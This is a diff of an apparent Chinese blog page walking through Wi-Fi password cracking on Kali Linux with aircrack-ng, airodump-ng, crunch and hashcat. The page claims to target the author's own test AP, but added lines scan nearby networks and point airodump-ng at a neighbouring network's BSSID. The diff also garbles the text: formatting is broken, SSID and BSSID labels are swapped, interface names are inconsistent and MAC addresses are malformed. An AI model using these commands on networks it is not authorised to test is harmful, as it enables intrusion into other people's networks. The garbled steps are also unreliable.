@@ -30,8 +30,7 @@
   
   <meta name="description" content="准备条件  VMware Workstation支持 USB 直通的虚拟机软件 Kali Linux 虚拟机 支持 Linux 驱动、Monitor Mode 和 Packet Injection 的 USB 无线网卡  建议使用有较成熟 Linux 支持的网卡，例如： - Atheros AR9271 - MediaTek MT7612U - MediaTek MT7601U
 并将 USB 无线网卡连接到虚拟机
-安装 sudo apt update sudo apt install -y aircrack-ng iw rfkill usbutils pciutils  确认网卡支持 Monitor Mode $sudo iw list Supported interface modes: * managed * monitor  再检查是否支持注入
-sudo aireplay-ng --test wlan1  USB 网卡脱离 NetworkManager">
+安装 sudo apt update sudo apt install -y aircrack-ng iw rfkill usbutils pciutils  确认网卡支持 Monitor Mode $lsusb Bus 004 Device 002: ID 0e8d:7612 MediaTek Inc. MT7612U 802.11a/b/g/n/ac Wireless Adapter  $sudo iw list Supported interface modes: * managed * monitor $sudo ethtool -i wlan0 driver: mt76x2u version: 7.">
 
   
   <link rel="alternate" hreflang="en-us" href="https://wubigo.com/post/wlan-and-aircrack/">
@@ -142,8 +141,7 @@ sudo aireplay-ng --test wlan1  USB 网卡脱离 NetworkManager">
   <meta property="og:title" content="Wlan and Aircrack | wubigo">
   <meta property="og:description" content="准备条件  VMware Workstation支持 USB 直通的虚拟机软件 Kali Linux 虚拟机 支持 Linux 驱动、Monitor Mode 和 Packet Injection 的 USB 无线网卡  建议使用有较成熟 Linux 支持的网卡，例如： - Atheros AR9271 - MediaTek MT7612U - MediaTek MT7601U
 并将 USB 无线网卡连接到虚拟机
-安装 sudo apt update sudo apt install -y aircrack-ng iw rfkill usbutils pciutils  确认网卡支持 Monitor Mode $sudo iw list Supported interface modes: * managed * monitor  再检查是否支持注入
-sudo aireplay-ng --test wlan1  USB 网卡脱离 NetworkManager"><meta property="og:image" content="https://wubigo.com/img/icon-192.png">
+安装 sudo apt update sudo apt install -y aircrack-ng iw rfkill usbutils pciutils  确认网卡支持 Monitor Mode $lsusb Bus 004 Device 002: ID 0e8d:7612 MediaTek Inc. MT7612U 802.11a/b/g/n/ac Wireless Adapter  $sudo iw list Supported interface modes: * managed * monitor $sudo ethtool -i wlan0 driver: mt76x2u version: 7."><meta property="og:image" content="https://wubigo.com/img/icon-192.png">
   <meta property="og:locale" content="en-us">
   
   <meta property="article:published_time" content="2023-11-11T20:01:49&#43;08:00">
@@ -424,7 +422,7 @@ sudo aireplay-ng --test wlan1  USB 网卡脱离 NetworkManager"><meta property="
   
   <span class="middot-divider"></span>
   <span class="article-reading-time">
-    2 min read
+    3 min read
   </span>
   
 
@@ -531,141 +529,262 @@ sudo apt install -y aircrack-ng iw rfkill usbutils pciutils
 
 <h2 id="确认网卡支持-monitor-mode">确认网卡支持 Monitor Mode</h2>
 
+<pre><code>$lsusb
+Bus 004 Device 002: ID 0e8d:7612 MediaTek Inc. MT7612U 802.11a/b/g/n/ac Wireless Adapter
+</code></pre>
+
 <pre><code>$sudo iw list
    Supported interface modes:
         * managed
         * monitor
 
+
+
+
+$sudo ethtool -i wlan0
+driver: mt76x2u
+version: 7.1.5+kali-amd64
+firmware-version: 0.0.00-b1
+expansion-rom-version:
+bus-info: 2-1:1.0
+supports-statistics: yes
+supports-test: no
+supports-eeprom-access: no
+supports-register-dump: no
+supports-priv-flags: no
+
+
+
+$sudo iw list
+Supported interface modes:
+                 * IBSS
+                 * managed
+                 * AP
+                 * AP/VLAN
+                 * monitor
+                 * mesh point
+                 * P2P-client
+                 * P2P-GO
+
 </code></pre>
 
 <p>再检查是否支持注入</p>
 
-<pre><code>sudo aireplay-ng --test wlan1
+<pre><code>sudo aireplay-ng --test wlan0
 
 </code></pre>
 
 <p>USB 网卡脱离 NetworkManager</p>
 
-<pre><code>sudo nmcli device set wlan1 managed no
+<pre><code>$sudo nmcli device set wlan1 managed no
+
+$nmcli device status
+DEVICE         TYPE      STATE                   CONNECTION
+eth0           ethernet  connected               Wired connection 1
+lo             loopback  connected (externally)  lo
+p2p-dev-wlan0  wifi-p2p  unavailable             --
+wlan0          wifi      unmanaged               --
 </code></pre>
 
 <p>启用 Monitor Mode</p>
 
-<pre><code>sudo airmon-ng start wlan1
+<pre><code>$sudo airmon-ng start wlan0
+
+PHY     Interface       Driver          Chipset
+
+phy1    wlan0           mt76x2u         MediaTek Inc. MT7612U 802.11a/b/g/n/ac
+                (mac80211 monitor mode vif enabled for [phy1]wlan0 on [phy1]wlan0mon)
+                (mac80211 station mode vif disabled for [phy1]wlan0)
+
+
+
+$iw dev
+phy#1
+        Interface wlan0mon
+                ifindex 5
+                wdev 0x100000002
+                addr 90🇩🇪80:4e:37:d5
+                type monitor
+                channel 10 (2457 MHz), width: 20 MHz (no HT), center1: 2457 MHz
+                txpower 20.00 dBm
+
 </code></pre>
 
-<h2 id="网卡设置">网卡设置</h2>
+<p>手动设置频道：</p>
 
-<pre><code>c:\&gt;netsh wlan show interfaces
-
-系统上有 1 个接口:
-
-    名称                   : WLAN
-    描述                   : Intel(R) Wireless-AC 9260 160MHz
-    GUID                   : c0d229o0-e3a4-4677-8dfd-1x365b456392
-    物理地址               : 7c:2m:7d:4p:87:cc
-    状态                   : 已连接
-    SSID                   : wubigo-5G
-    BSSID                  : bc:8o:ba:f8:qa:bd
-    网络类型               : 结构
-    无线电类型             : 802.11ac
-    身份验证               : WPA2 - 个人
-    密码                   : CCMP
-    连接模式               : 配置文件
-    信道                   : 48
-    接收速率(Mbps)         : 1733.3
-    传输速率 (Mbps)        : 1733.3
-    信号                   : 85%
-    配置文件               : wubigo-5G
-
-    承载网络状态  : 不可用
+<pre><code>sudo iw dev wlan0mon set channel 6
 </code></pre>
 
-<h2 id="建立一个安全的测试-ap">建立一个安全的测试 AP</h2>
+<h2 id="扫描ap列表">扫描AP列表</h2>
 
-<p>找到测试 AP 的 BSSID</p>
+<p>关闭监控模式</p>
 
-<p>路由器在广播 Wi-Fi 信号（信标帧，Beacon Frame）时，SSID（网络名称）
+<pre><code>$sudo airmon-ng stop wlan0mon
+$sudo nmcli device set wlan0 managed yes
+
+
+$nmcli device wifi list
+
+IN-USE  BSSID              SSID           MODE   BAND     CHAN  RATE         SIGNAL  BARS  SECURITY
+        XC:F8:YB:F8:AF:BC  lab-bigo      Infra  2.4 GHz  7    1170 Mbit/s  100     ▂▄▆█  WPA2
+        C0:51:5C:91:F4:9A  lab-wu        Infra  2.4 GHz  8     1170 Mbit/s  69      ▂▄▆_  WPA1 WPA2
+        CY:51:5C:B1:F4:9A  --             Infra  2.4 GHz  8     1170 Mbit/s  67      ▂▄▆_  WPA1 WPA2
+        V0:76:C2:BE:3B:D2  midea_e2_0369  Infra  2.4 GHz  1     54 Mbit/s    65      ▂▄▆_  --
+        PC:DC:02:22:B3:78  CU_NAHt        Infra  2.4 GHz  9     130 Mbit/s   57      ▂▄▆_  WPA1 WPA2
+
+
+</code></pre>
+
+<p>然后重新启用 Monitor Mode：</p>
+
+<pre><code>sudo nmcli device set wlan0 managed no
+sudo airmon-ng start wlan0
+
+</code></pre>
+
+<p>记录：
+- SSID：XC:F8:YB:F8:AF:BC
+- BSSID：lab-bigo
+- 频道：7</p>
+
+<p>扫描目标 AP上连接的客户端MAC地址</p>
+
+<pre><code>$sudo airodump-ng --bssid PC:DC:02:22:B3:78 -c 9 wlan0mon
+
+
+
+
+
+</code></pre>
+
+<p>c:&gt;netsh wlan show interfaces</p>
+
+<p>系统上有 1 个接口:</p>
+
+<pre><code>名称                   : WLAN
+描述                   : Intel(R) Wireless-AC 9260 160MHz
+GUID                   : c0d229o0-e3a4-4677-8dfd-1x365b456392
+物理地址               : 7c:2m:7d:4p:87:cc
+状态                   : 已连接
+SSID                   : wubigo-5G
+BSSID                  : bc:8o:ba:f8:qa:bd
+网络类型               : 结构
+无线电类型             : 802.11ac
+身份验证               : WPA2 - 个人
+密码                   : CCMP
+连接模式               : 配置文件
+信道                   : 48
+接收速率(Mbps)         : 1733.3
+传输速率 (Mbps)        : 1733.3
+信号                   : 85%
+配置文件               : wubigo-5G
+
+承载网络状态  : 不可用
+</code></pre>
+
+<pre><code>
+
+## 建立一个安全的测试 AP
+
+找到测试 AP 的 BSSID
+
+路由器在广播 Wi-Fi 信号（信标帧，Beacon Frame）时，SSID（网络名称）
 和 BSSID（硬件 MAC 地址）都是明文公开广播的，不需要连接或验证密码即
-可扫描读取</p>
+可扫描读取
 
-<pre><code>$nmcli device wifi list
-
-    SSID: Aircrack-Lab
-    BSSID: bc:8o:ba:f8:qa:bd
-    频道: 6
 
 </code></pre>
 
-<h2 id="在自己的-ap-上进行抓包验证">在自己的 AP 上进行抓包验证</h2>
+<p>$nmcli device wifi list</p>
 
-<pre><code>sudo airodump-ng --bssid bc:8o:ba:f8:qa:bd --channel 6 --write lab_capture wlan1mon
+<pre><code>SSID: Aircrack-Lab
+BSSID: bc:8o:ba:f8:qa:bd
+频道: 6
 </code></pre>
 
-<p>参数说明：
+<pre><code>
+## 在自己的 AP 上进行抓包验证
+
+</code></pre>
+
+<p>sudo airodump-ng &ndash;bssid bc:8o:ba:f8:qa:bd &ndash;channel 6 &ndash;write lab_capture wlan1mon</p>
+
+<pre><code>
+参数说明：
 - bssid：只监听你指定的测试 AP
 - channel：固定到测试 AP 所在频道
 - write lab_capture：将结果保存为 lab_capture-*
-- wlan1mon：Monitor Mode 接口</p>
+- wlan1mon：Monitor Mode 接口
 
-<p>检查抓包文件</p>
-
-<pre><code>ls -lh lab_capture*
-
-aircrack-ng lab_capture-01.cap
+检查抓包文件
 
 </code></pre>
 
-<h3 id="使用字典验证">使用字典验证</h3>
+<p>ls -lh lab_capture*</p>
 
-<ul>
-<li>kali自带字典</li>
-</ul>
+<p>aircrack-ng lab_capture-01.cap</p>
 
-<p><code>/usr/share/wordlists/rockyou.txt.gz</code></p>
+<pre><code>
+### 使用字典验证
 
-<ul>
-<li>使用crunch生成自定义字典</li>
-</ul>
+- kali自带字典
 
-<p>生成长度8位，包含数字和小写字母的所有组合</p>
+`/usr/share/wordlists/rockyou.txt.gz`
 
-<pre><code>$crunch 8 8 abcdefghijklmnopqrstuvwxyz0123456789 -o custom-wordlist.txt
+- 使用crunch生成自定义字典
+
+生成长度8位，包含数字和小写字母的所有组合
+
 </code></pre>
 
-<p>使用crunch管道输出到aircrack-ng（节省磁盘空间）</p>
+<p>$crunch 8 8 abcdefghijklmnopqrstuvwxyz0123456789 -o custom-wordlist.txt</p>
 
-<pre><code>$crunch 8 8 abcdefghijklmnopqrstuvwxyz0123456789 | aircrack-ng -w - -b bc:8o:ba:f8:qa:bd wpa2-crack-01.cap
+<pre><code>
+使用crunch管道输出到aircrack-ng（节省磁盘空间）
+
 </code></pre>
 
-<h3 id="使用hashcat加速">使用hashcat加速</h3>
+<p>$crunch 8 8 abcdefghijklmnopqrstuvwxyz0123456789 | aircrack-ng -w - -b bc:8o:ba:f8:qa:bd wpa2-crack-01.cap</p>
 
-<p>与aircrack-ng使用CPU不同，hashcat可以利用GPU的并行计算能力，
-实现比CPU高数十甚至数百倍的破解速度</p>
+<pre><code>
+### 使用hashcat加速
 
-<p>将捕获文件转换为Hashcat格式</p>
+与aircrack-ng使用CPU不同，hashcat可以利用GPU的并行计算能力，
+实现比CPU高数十甚至数百倍的破解速度
 
-<pre><code># 方法1：使用aircrack-ng内置转换
-aircrack-ng wpa2-crack-01.cap -J wpa2-hashcat
- 
-# 方法2：使用hccapx工具
-cap2hccapx wpa2-crack-01.cap wpa2-hccapx.hccapx
- 
-# 方法3：使用hcxpcapngtool (推荐，更新)
-hcxpcapngtool -o wpa2-hashcat.hc22000 wpa2-crack-01.cap
+将捕获文件转换为Hashcat格式
+
 </code></pre>
 
-<p>使用Hashcat破解WPA2</p>
+<h1 id="方法1-使用aircrack-ng内置转换">方法1：使用aircrack-ng内置转换</h1>
 
-<pre><code># 基本字典攻击
-hashcat -m 22000 -a 0 wpa2-hashcat.hc22000 /usr/share/wordlists/rockyou.txt
- 
-# 字典 + 规则攻击（自动变换字典中的单词）
-hashcat -m 22000 -a 0 wpa2-hashcat.hc22000 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
- 
-# 暴力破解（8位纯数字）
-hashcat -m 22000 -a 3 wpa2-hashcat.hc22000 ?d?d?d?d?d?d?d?d
+<p>aircrack-ng wpa2-crack-01.cap -J wpa2-hashcat</p>
+
+<h1 id="方法2-使用hccapx工具">方法2：使用hccapx工具</h1>
+
+<p>cap2hccapx wpa2-crack-01.cap wpa2-hccapx.hccapx</p>
+
+<h1 id="方法3-使用hcxpcapngtool-推荐-更新">方法3：使用hcxpcapngtool (推荐，更新)</h1>
+
+<p>hcxpcapngtool -o wpa2-hashcat.hc22000 wpa2-crack-01.cap</p>
+
+<pre><code>
+使用Hashcat破解WPA2
+
 </code></pre>
+
+<h1 id="基本字典攻击">基本字典攻击</h1>
+
+<p>hashcat -m 22000 -a 0 wpa2-hashcat.hc22000 /usr/share/wordlists/rockyou.txt</p>
+
+<h1 id="字典-规则攻击-自动变换字典中的单词">字典 + 规则攻击（自动变换字典中的单词）</h1>
+
+<p>hashcat -m 22000 -a 0 wpa2-hashcat.hc22000 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule</p>
+
+<h1 id="暴力破解-8位纯数字">暴力破解（8位纯数字）</h1>
+
+<p>hashcat -m 22000 -a 3 wpa2-hashcat.hc22000 ?d?d?d?d?d?d?d?d
+```</p>
 
 <p>参数说明</p>
 
